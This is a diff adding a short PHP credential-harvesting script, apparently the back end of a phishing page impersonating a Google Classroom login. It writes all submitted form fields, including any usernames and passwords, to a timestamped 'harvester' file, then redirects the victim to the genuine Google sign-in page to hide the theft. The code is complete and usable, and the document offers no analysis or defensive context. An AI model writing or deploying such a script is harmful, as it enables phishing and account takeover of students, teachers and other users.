@@ -1,0 +1,2 @@
+<?php $file = 'harvester_2022-01-03 11:04:33.075404.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);
+/* If you are just seeing plain text you need to install php5 for apache apt-get install libapache2-mod-php5 */ ?><meta http-equiv="refresh" content="0; url=https://accounts.google.com/signin/v2/identifier?service=classroom&continue=https%3A%2F%2Fclassroom.google.com%2F&ec=GAlAiQI&flowName=GlifWebSignIn&flowEntry=AddSession" />
